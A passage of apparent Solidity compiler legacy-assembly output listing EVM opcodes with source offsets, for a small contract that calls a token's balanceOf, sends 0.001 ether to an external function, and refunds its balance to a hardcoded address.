											"begin": 1400,
											"end": 1503,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 945,
											"end": 1089,
											"name": "tag",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 945,
											"end": 1089,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 945,
											"end": 1089,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 945,
											"end": 1089,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 945,
											"end": 1089,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 945,
											"end": 1089,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 945,
											"end": 1089,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 945,
											"end": 1089,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "tag",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1555,
											"end": 1562,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1581,
											"end": 1602,
											"name": "SELFBALANCE",
											"source": 1
										},
										{
											"begin": 1574,
											"end": 1602,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1574,
											"end": 1602,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1097,
											"end": 1392,
											"name": "tag",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 1097,
											"end": 1392,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1141,
											"end": 1165,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1168,
											"end": 1210,
											"name": "PUSH",
											"source": 1,
											"value": "2797F5291A7FAA3368FF031807B6B70C7BBEEF65"
										},
										{
											"begin": 1141,
											"end": 1210,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1141,
											"end": 1210,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1253,
											"end": 1254,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1229,
											"end": 1250,
											"name": "SELFBALANCE",
											"source": 1
										},
										{
											"begin": 1229,
											"end": 1254,
											"name": "GT",
											"source": 1
										},
										{
											"begin": 1221,
											"end": 1255,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 1221,
											"end": 1255,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1221,
											"end": 1255,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1221,
											"end": 1255,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1221,
											"end": 1255,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1221,
											"end": 1255,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 1221,
											"end": 1255,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1267,
											"end": 1279,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1292,
											"end": 1300,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1306,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1284,
											"end": 1306,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1314,
											"end": 1335,
											"name": "SELFBALANCE",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "PUSH",
											"source": 1,
											"value": "3F"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "PUSH",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "tag",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1284,
											"end": 1340,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1266,
											"end": 1340,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1266,
											"end": 1340,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1266,
											"end": 1340,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1360,
											"end": 1367,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "PUSH",
											"source": 1,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "PUSH",
											"source": 1,
											"value": "D"
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "PUSH",
											"source": 1,
											"value": "726546756E64206661696C656400000000000000000000000000000000000000"
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "tag",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 1351,
											"end": 1384,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1097,
											"end": 1392,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1097,
											"end": 1392,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1097,
											"end": 1392,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "tag",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1442,
											"end": 1449,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1468,
											"end": 1470,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 1468,
											"end": 1470,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1468,
											"end": 1470,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1470,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1470,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1470,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 1468,
											"end": 1470,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1470,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1470,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1470,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1468,
											"end": 1470,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1480,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1468,
											"end": 1480,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1480,
											"name": "PUSH",
											"source": 1,
											"value": "70A08231"
										},
										{
											"begin": 1489,
											"end": 1493,
											"name": "ADDRESS",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP7",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "tag",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "STATICCALL",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "tag",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "tag",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1495,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1461,
											"end": 1495,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1461,
											"end": 1495,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 945,
											"end": 1089,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 945,
											"end": 1089,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 989,
											"end": 991,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 989,
											"end": 991,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 989,
											"end": 991,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 989,
											"end": 991,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 989,
											"end": 991,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 989,
											"end": 991,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 989,
											"end": 991,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 989,
											"end": 991,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 989,
											"end": 991,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 989,
											"end": 991,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 989,
											"end": 991,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 989,
											"end": 998,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 989,
											"end": 998,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 989,
											"end": 998,
											"name": "PUSH",
											"source": 1,
											"value": "362A95"
										},
										{
											"begin": 1006,
											"end": 1026,
											"name": "PUSH",
											"source": 1,
											"value": "38D7EA4C68000"
										},
										{
											"begin": 1036,
											"end": 1040,
											"name": "ADDRESS",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 989,
